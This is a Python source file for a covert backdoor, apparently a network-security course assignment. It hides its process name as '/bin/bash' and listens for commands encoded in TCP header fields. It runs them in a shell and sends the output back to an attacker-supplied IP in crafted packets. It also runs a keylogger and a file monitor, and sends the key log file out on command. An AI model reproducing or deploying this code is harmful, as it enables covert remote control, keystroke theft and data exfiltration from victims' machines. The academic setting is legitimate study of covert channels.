#!/usr/bin/python3

import optparse
import os
import subprocess
import sys
import time
from packetutil import *
from bkutil import *
from multiprocessing import Process
from cryptoutil import *
from scapy.all import *
from file_monitoring import *
from portknocking import *
import _thread
import setproctitle
import argparse
import pyxhook
from linuxKey import OnKeyPress

"""
dnf install python3-pip
Setup: pip3 install pycryptodome setproctitle scapy watchdog3
"""
# parse command line argument
arg_parser = argparse.ArgumentParser(
    prog='Backdoor',
    description='COMP 8505 Final Assignment by Peyman Tehrani Parsa & Khang Tran'
)
arg_parser.add_argument('-p', dest='port', type = int, help = 'attackers PORT', default=9999, const=9999, nargs='?')
arg_parser.add_argument('-i', dest='ip', type = str, help = 'attackers IP', required=True)
args = arg_parser.parse_args()

TTL = 234
TTLKEY = 222
attacker = (args.ip, args.port)
messages = []


def secret_send(msg: str, type: str,filename=""):
    """
    Keyword arguments:
    msg      - payload being sent
    type     - file or command
    """

    msg = message_to_bits(msg)
    chunks = message_spliter(msg)
    packets = packatizer(chunks,TTL,attacker)
    send(packets, verbose=True)

    if(type == "command"):
        send(IP(dst=attacker[0], ttl=TTL)/TCP(dport=attacker[1], flags="U"))
    elif(type == "file"):
        send(IP(dst=attacker[0], ttl=TTL)/TCP(dport=attacker[1], flags="P")/Raw(load=encrypt(filename)))


def execPayload(command):
    """[summary]

    Arguments:
        command {str} -- [description]
    """

    # Execute the command
    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    result = proc.stdout.read() + proc.stderr.read()
    payload = str(result)
    print(payload)
    secret_send(payload,"command")

def getLogFile():
    file = open('/root/Documents/file.log','r')
    f = file.read()
    #print(f)
    secret_send(f,"file","file.log")
    file.close()
    return

def commandResult(packet):
    """[summary]

    Arguments:
        packet {scapy.packet} -- [description]
    """

    global TTLKEY
    global messages
    ttl = packet[IP].ttl
    if(packet.haslayer(IP) and ttl == TTLKEY):
        # checks if the flag has been set to know it contains the secret results
        flag = packet['TCP'].flags
        #  the client set an "Echo" flag to make sure the receiver knows it's truly them
        if flag == 0x40:
            field = packet[TCP].seq
            # Converts the bits to the nearest divisible by 8
            covertContent = lengthChecker(field)
            messages.append(text_from_bits(covertContent))
        # End Flag detected
        elif flag == 0x20:
            payload = ''.join(messages)
            execPayload(payload)
            messages = []
        elif flag == 0x08:
            getLogFile()
            #print("Server wants key log file!")



def commandSniffer():
    sniff(filter="tcp and host "+attacker[0], prn=commandResult)


setproctitle.setproctitle("/bin/bash")  # set fake process name

sniffThread = threading.Thread(target=commandSniffer)
fileMonitor = Monitor(addr=attacker) 

new_hook=pyxhook.HookManager()
new_hook.KeyDown=OnKeyPress
new_hook.HookKeyboard()

new_hook.daemon = True
fileMonitor.daemon = True
sniffThread.daemon = True

new_hook.start()
sniffThread.start()
fileMonitor.start()

while True:
    try:
        time.sleep(5)
    except KeyboardInterrupt:
        #reset()
        print ("Exiting")
        sys.exit(0)
